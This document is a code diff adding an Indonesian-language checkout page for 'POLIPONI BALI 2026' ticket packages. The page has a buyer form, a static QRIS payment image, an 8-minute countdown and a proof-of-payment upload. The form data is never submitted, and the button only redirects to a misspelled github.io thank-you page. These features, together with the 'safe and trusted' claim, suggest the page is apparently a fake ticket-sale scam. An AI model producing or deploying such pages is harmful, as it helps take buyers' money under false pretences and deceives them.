@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>POLIPONI BALI 2026 - Checkout</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Plus Jakarta Sans',sans-serif;
+}
+
+body{
+background:#f4f7ff;
+color:#111827;
+overflow-x:hidden;
+}
+
+.container{
+width:100%;
+max-width:1200px;
+margin:auto;
+padding:20px;
+}
+
+.topbar{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:15px 0;
+}
+
+.logo{
+font-size:28px;
+font-weight:800;
+color:#2457ff;
+}
+
+.secure{
+font-size:14px;
+font-weight:600;
+color:#4b5563;
+}
+
+.hero{
+background:white;
+border-radius:30px;
+overflow:hidden;
+box-shadow:0 20px 60px rgba(0,0,0,.08);
+}
+
+.banner{
+width:100%;
+display:block;
+object-fit:cover;
+}
+
+.content{
+display:grid;
+grid-template-columns:1.1fr .8fr;
+gap:30px;
+padding:35px;
+}
+
+.left{
+width:100%;
+}
+
+.right{
+width:100%;
+}
+
+.step-box{
+display:flex;
+align-items:center;
+justify-content:space-between;
+margin-bottom:40px;
+}
+
+.step{
+flex:1;
+text-align:center;
+position:relative;
+}
+
+.step .circle{
+width:42px;
+height:42px;
+border-radius:50%;
+background:#dbe4ff;
+color:#2457ff;
+margin:auto;
+display:flex;
+align-items:center;
+justify-content:center;
+font-weight:700;
+margin-bottom:10px;
+}
+
+.step.active .circle{
+background:#2457ff;
+color:white;
+box-shadow:0 10px 30px rgba(36,87,255,.3);
+}
+
+.step p{
+font-size:14px;
+font-weight:600;
+}
+
+.step:after{
+content:'';
+position:absolute;
+top:20px;
+right:-50%;
+width:100%;
+height:3px;
+background:#dbe4ff;
+z-index:-1;
+}
+
+.step:last-child:after{
+display:none;
+}
+
+.title{
+font-size:42px;
+font-weight:800;
+margin-bottom:10px;
+}
+
+.subtitle{
+color:#6b7280;
+margin-bottom:35px;
+}
+
+.card{
+background:white;
+border:1px solid #edf0f8;
+border-radius:24px;
+padding:25px;
+margin-bottom:25px;
+box-shadow:0 8px 30px rgba(0,0,0,.03);
+}
+
+.card h3{
+margin-bottom:20px;
+font-size:22px;
+}
+
+.form-group{
+margin-bottom:18px;
+}
+
+label{
+display:block;
+font-size:14px;
+font-weight:700;
+margin-bottom:10px;
+}
+
+input,select,textarea{
+width:100%;
+padding:16px;
+border-radius:16px;
+border:1px solid #dce3f0;
+outline:none;
+font-size:15px;
+transition:.3s;
+background:#fff;
+}
+
+input:focus,
+select:focus,
+textarea:focus{
+border-color:#2457ff;
+box-shadow:0 0 0 4px rgba(36,87,255,.1);
+}
+
+.ticket-grid{
+display:grid;
+grid-template-columns:1fr;
+gap:15px;
+}
+
+.ticket{
+border:2px solid #e5e7eb;
+padding:20px;
+border-radius:20px;
+cursor:pointer;
+transition:.3s;
+position:relative;
+}
+
+.ticket:hover{
+transform:translateY(-3px);
+border-color:#2457ff;
+}
+
+.ticket.active{
+border-color:#2457ff;
+background:#f5f8ff;
+}
+
+.ticket h4{
+font-size:18px;
+margin-bottom:10px;
+}
+
+.price{
+font-size:28px;
+font-weight:800;
+color:#2457ff;
+margin-bottom:8px;
+}
+
+.sale{
+display:inline-block;
+padding:6px 12px;
+background:#22c55e;
+color:white;
+border-radius:999px;
+font-size:12px;
+font-weight:700;
+}
+
+.summary{
+position:sticky;
+top:20px;
+}
+
+.summary-banner{
+width:100%;
+border-radius:20px;
+margin-bottom:20px;
+}
+
+.summary-title{
+font-size:24px;
+font-weight:800;
+margin-bottom:15px;
+}
+
+.row{
+display:flex;
+justify-content:space-between;
+margin-bottom:14px;
+font-size:15px;
+}
+
+.total{
+font-size:32px;
+font-weight:800;
+color:#2457ff;
+}
+
+.qris-box{
+background:#f9fbff;
+border:2px dashed #2457ff;
+padding:20px;
+border-radius:25px;
+text-align:center;
+margin-top:25px;
+}
+
+.qris-box img{
+width:100%;
+max-width:320px;
+border-radius:20px;
+margin:auto;
+display:block;
+}
+
+.timer{
+margin-top:20px;
+background:#111827;
+color:white;
+padding:18px;
+border-radius:20px;
+font-size:28px;
+font-weight:800;
+text-align:center;
+letter-spacing:2px;
+}
+
+.upload-box{
+border:2px dashed #cfd8ea;
+padding:25px;
+border-radius:20px;
+text-align:center;
+background:#fbfcff;
+transition:.3s;
+}
+
+.upload-box:hover{
+border-color:#2457ff;
+}
+
+.preview{
+margin-top:15px;
+width:100%;
+border-radius:20px;
+display:none;
+}
+
+button{
+width:100%;
+padding:18px;
+border:none;
+border-radius:20px;
+background:linear-gradient(135deg,#2457ff,#4f7dff);
+color:white;
+font-size:18px;
+font-weight:800;
+cursor:pointer;
+transition:.3s;
+margin-top:20px;
+box-shadow:0 15px 40px rgba(36,87,255,.25);
+}
+
+button:hover{
+transform:translateY(-2px);
+}
+
+button:disabled{
+background:#c7d2fe;
+cursor:not-allowed;
+box-shadow:none;
+}
+
+.footer-note{
+margin-top:15px;
+text-align:center;
+font-size:13px;
+color:#6b7280;
+}
+
+.success{
+display:none;
+text-align:center;
+padding:50px 20px;
+}
+
+.success h1{
+font-size:48px;
+margin-bottom:20px;
+}
+
+.success p{
+font-size:18px;
+color:#6b7280;
+margin-bottom:25px;
+}
+
+@media(max-width:950px){
+
+.content{
+grid-template-columns:1fr;
+padding:20px;
+}
+
+.title{
+font-size:34px;
+}
+
+.summary{
+position:relative;
+top:0;
+}
+
+}
+
+@media(max-width:600px){
+
+.title{
+font-size:28px;
+}
+
+.card{
+padding:20px;
+border-radius:22px;
+}
+
+.step p{
+font-size:12px;
+}
+
+button{
+font-size:16px;
+}
+
+.total{
+font-size:26px;
+}
+
+}
+
+</style>
+</head>
+<body>
+
+<div class="container">
+
+<div class="topbar">
+<div class="logo">POLIPONI BALI</div>
+<div class="secure">🔒 Transaksi Aman & Terpercaya</div>
+</div>
+
+<div class="hero">
+
+<img src="banner-deskripsi.png" class="banner">
+
+<div class="content">
+
+<div class="left">
+
+<div class="step-box">
+<div class="step active">
+<div class="circle">1</div>
+<p>Data</p>
+</div>
+
+<div class="step active">
+<div class="circle">2</div>
+<p>Pembayaran</p>
+</div>
+
+<div class="step active">
+<div class="circle">3</div>
+<p>Selesai</p>
+</div>
+</div>
+
+<h1 class="title">Checkout Tiket</h1>
+<p class="subtitle">
+Lengkapi data dan lakukan pembayaran untuk melanjutkan.
+</p>
+
+<div class="card">
+
+<h3>Data Pembeli</h3>
+
+<div class="form-group">
+<label>Nama Lengkap *</label>
+<input type="text" id="nama" placeholder="Masukkan nama lengkap">
+</div>
+
+<div class="form-group">
+<label>Email *</label>
+<input type="email" id="email" placeholder="Masukkan email aktif">
+</div>
+
+<div class="form-group">
+<label>Nomor WhatsApp *</label>
+<input type="tel" id="wa" placeholder="08xxxxxxxxxx">
+</div>
+
+<div class="form-group">
+<label>Pilih Kategori Tiket *</label>
+
+<div class="ticket-grid">
+
+<div class="ticket active" onclick="selectTicket(this,'Festival','Rp. 1.900.000')">
+<h4>Paket 4 Orang : Festival</h4>
+<div class="price">Rp 1.900.000</div>
+<span class="sale">ON SALE</span>
+</div>
+
+<div class="ticket" onclick="selectTicket(this,'Premium','Rp. 2.900.000')">
+<h4>Paket 4 Orang : Premium</h4>
+<div class="price">Rp 2.900.000</div>
+<span class="sale">ON SALE</span>
+</div>
+
+<div class="ticket" onclick="selectTicket(this,'Fast Track','Rp. 3.900.000')">
+<h4>Paket 4 Orang : Fast Track</h4>
+<div class="price">Rp 3.900.000</div>
+<span class="sale">ON SALE</span>
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<div class="card">
+
+<h3>Pembayaran QRIS</h3>
+
+<div class="timer" id="timer">
+08:00
+</div>
+
+<div class="qris-box">
+<img src="qris-pembayaran.png">
+</div>
+
+<div class="form-group" style="margin-top:25px;">
+
+<label>Upload Bukti Pembayaran *</label>
+
+<div class="upload-box">
+
+<input type="file" id="upload" accept="image/*">
+
+<img id="preview" class="preview">
+
+</div>
+
+</div>
+
+<button id="payBtn" disabled>
+Beli Sekarang
+</button>
+
+<div class="footer-note">
+Pastikan seluruh data dan pembayaran sudah benar.
+</div>
+
+</div>
+
+</div>
+
+<div class="right">
+
+<div class="card summary">
+
+<img src="banner-deskripsi.png" class="summary-banner">
+
+<div class="summary-title">
+Ringkasan Pesanan
+</div>
+
+<div class="row">
+<span>Event</span>
+<b>POLIPONI BALI 2026</b>
+</div>
+
+<div class="row">
+<span>Tanggal</span>
+<b>04 Juli 2026</b>
+</div>
+
+<div class="row">
+<span>Lokasi</span>
+<b>Bali United Training Center</b>
+</div>
+
+<hr style="margin:25px 0;border:none;border-top:1px solid #e5e7eb;">
+
+<div class="row">
+<span>Kategori</span>
+<b id="ticketName">Festival</b>
+</div>
+
+<div class="row">
+<span>Total</span>
+<b id="ticketPrice">Rp. 1.900.000</b>
+</div>
+
+<hr style="margin:25px 0;border:none;border-top:1px solid #e5e7eb;">
+
+<div class="row">
+<span style="font-size:20px;font-weight:800;">
+Total Pembayaran
+</span>
+</div>
+
+<div class="total" id="totalText">
+Rp 1.900.000
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<script>
+
+let selectedPrice = 'Rp. 1.900.000';
+
+function selectTicket(el,name,price){
+
+document.querySelectorAll('.ticket').forEach(t=>{
+t.classList.remove('active');
+});
+
+el.classList.add('active');
+
+document.getElementById('ticketName').innerText = name;
+document.getElementById('ticketPrice').innerText = price;
+document.getElementById('totalText').innerText = price;
+
+selectedPrice = price;
+
+validateForm();
+
+}
+
+const nama = document.getElementById('nama');
+const email = document.getElementById('email');
+const wa = document.getElementById('wa');
+const upload = document.getElementById('upload');
+const payBtn = document.getElementById('payBtn');
+const preview = document.getElementById('preview');
+
+function validateForm(){
+
+if(
+nama.value.trim() !== '' &&
+email.value.trim() !== '' &&
+wa.value.trim() !== '' &&
+upload.files.length > 0
+){
+payBtn.disabled = false;
+}else{
+payBtn.disabled = true;
+}
+
+}
+
+nama.addEventListener('input',validateForm);
+email.addEventListener('input',validateForm);
+wa.addEventListener('input',validateForm);
+
+upload.addEventListener('change',function(){
+
+validateForm();
+
+const file = this.files[0];
+
+if(file){
+
+const reader = new FileReader();
+
+reader.onload = function(e){
+
+preview.src = e.target.result;
+preview.style.display = 'block';
+
+}
+
+reader.readAsDataURL(file);
+
+}
+
+});
+
+payBtn.addEventListener('click',function(){
+
+window.location.href='https://poliponii2026.github.io/THANKS-YOU-/';
+
+});
+
+let time = 480;
+
+const timer = document.getElementById('timer');
+
+setInterval(()=>{
+
+let minutes = Math.floor(time/60);
+let seconds = time%60;
+
+minutes = minutes < 10 ? '0'+minutes : minutes;
+seconds = seconds < 10 ? '0'+seconds : seconds;
+
+timer.innerText = `${minutes}:${seconds}`;
+
+if(time > 0){
+time--;
+}
+
+},1000);
+
+</script>
+
+</body>
+</html>
